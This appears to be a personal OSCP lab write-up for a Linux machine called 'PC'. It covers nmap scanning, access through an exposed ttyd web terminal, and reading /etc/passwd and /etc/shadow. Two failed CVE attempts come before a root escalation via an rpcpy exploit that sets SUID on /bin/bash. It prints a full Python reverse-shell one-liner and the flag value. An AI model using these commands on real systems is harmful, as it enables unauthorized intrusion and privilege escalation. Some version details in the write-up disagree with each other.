---
title: OSCP - PC - Linux
created: 2026-01-26
updated: 2025-10-02
status: seed
draft: false
tags:
  - cyber-security
Related:
  - "[[OSCP]]"
  - "[[Cybersecurity]]"
---
# PC
This was an interesting one, with `linpeas` showing multiple vulnerabilities and yet the most obvious two didn't work because of missing dependencies and no user credentials. 

Figuring out how `rpcpy-exploit` worked was interesting, but the real lesson here was understanding how if the SUID binary can be set then you can run Bash in privileged mode with `/bin/bash -p` and become `root`

# Resolution summary
- Ran Nmap to identify ports `22` & `8000`
- Visited http (`8000`) & identified `ttyd`
- Created reverse shell and enumerated target
- Ran `linpeas.sh` and identified multiple vulnerabilities and `rpc.sh` script
- Identified exploit for `rpc.sh` and used it to modify `/bin/bash` set permission
- Used `/bin/bash -p` to switch to `root`
## Improved skills
- Identifying vulnerabilities & scripts with `linpeas.sh`
## Used tools
- nmap
- ttyd
- python

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN PC.nmap 192.168.215.210 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
8000/tcp open  http-alt ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|_http-title: ttyd - Terminal
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 173
|     <html><head><meta charset=utf-8 http-equiv="Content-Language" content="en"/><link rel="stylesheet" type="text/css" href="/error.css"/></head><body><h1>404</h1></body></html>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 677047
|     <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>ttyd - Terminal</title><link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vb
|   Socks5, X11Probe: 
|     HTTP/1.0 403 Forbidden
|     server: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
|     content-type: text/html
|     content-length: 173
|_    <html><head><meta charset=utf-8 http-equiv="Content-Language" content="en"/><link rel="stylesheet" type="text/css" href="/error.css"/></head><body><h1>403</h1></body></html>
1 service unrecognized despite returning data.
```

---
# Enumeration
## Port 22 - SSH (OpenSSH 7.9p1)
No enumeration conducted
## Port 8000 - HTTP (ttyd-alt)
- Navigated to `http://192.168.215.210:8000`, found `ttyd` service running, and enumerated available directories
![OSCP PC Linux Image1](/images/OSCP%20-%20PC%20-%20Linux%20-%20image1.png)
- Ran `cat /etc/passwd` to find other users, and `cat /etc/shadow` to test shadow file
![OSCP PC Linux Image2](/images/OSCP%20-%20PC%20-%20Linux%20-%20image2.png)
- Ran `ttyd -h` to view TTYD help, then checked version
![OSCP PC Linux Image3](/images/OSCP%20-%20PC%20-%20Linux%20-%20image3.png)
- Ran `ps aux` to identify running processes and identified `python3 /opt/rpy.py` running under `root` - potentially vulnerable to CVE-2022-35411
![OSCP PC Linux Image4](/images/OSCP%20-%20PC%20-%20Linux%20-%20image4.png)
- Started netcat listener on port 4444 and created reverse shell with command `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.250",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'` 
![OSCP PC Linux Image5](/images/OSCP%20-%20PC%20-%20Linux%20-%20image5.png)
- Upgraded shell, uploaded `suid3num.py` from [Anon-Exploiter](https://github.com/Anon-Exploiter/SUID3NUM), and executed python script for no exploitable binaries.
![OSCP PC Linux Image6](/images/OSCP%20-%20PC%20-%20Linux%20-%20image6.png)
- Uploaded `linpeas.sh` and executed script
![OSCP PC Linux Image7](/images/OSCP%20-%20PC%20-%20Linux%20-%20image7.png)
- Identified sudo version 1.8.3 - potentially vulnerable to CVE-2021-3156
- Identified vulnerable to CVE-2021-3560
- Identified process `1045` run by `user` but ppid is `root`
![OSCP PC Linux Image10](/images/OSCP%20-%20PC%20-%20Linux%20-%20image10.png)
- Identified potentially vulnerable Pkexec policy for user
![OSCP PC Linux Image11](/images/OSCP%20-%20PC%20-%20Linux%20-%20image11.png)
	- Checked `pkexe` binary permissions
![OSCP PC Linux Image12](/images/OSCP%20-%20PC%20-%20Linux%20-%20image12.png)

---
# Exploitation

## CVE-2021-3560
- Uploaded `poc.sh` and attempted to exploit Polkit privesc - missing `Accounts service` and `gnome-control-center`
![OSCP PC Linux Image13](/images/OSCP%20-%20PC%20-%20Linux%20-%20image13.png)
## CVE-2023-22809
- Uploaded `exploit.sh` from [https://github.com/asepsaepdin/CVE-2023-22809/blob/main/exploit.sh] and attempted to exploit `sudo v1.8.3` privesc - do not have `user` password
![OSCP PC Linux Image14](/images/OSCP%20-%20PC%20-%20Linux%20-%20image14.png)
---
# Privilege Escalation
## CVE-2022-35411
- Modified `rpcpy-exploit.py` from [https://github.com/ehtec/rpcpy-exploit/blob/main/rpcpy-exploit.py] to execute `chmod +s /bin/bash` on target as `root`
![OSCP PC Linux Image15](/images/OSCP%20-%20PC%20-%20Linux%20-%20image15.png)
- Ran `python3 rpcpy-exploit.py` on target, then ran `/bin/bash -p` to run Bash as `root`
![OSCP PC Linux Image16](/images/OSCP%20-%20PC%20-%20Linux%20-%20image16.png)
- Ran `cat /root/proof.txt` for flag `0d69ed51214ecceb8e06fe516da4785e`
![OSCP PC Linux Image17](/images/OSCP%20-%20PC%20-%20Linux%20-%20image17.png)
---
# Trophy & Loot
`root.txt` = `0d69ed51214ecceb8e06fe516da4785e`
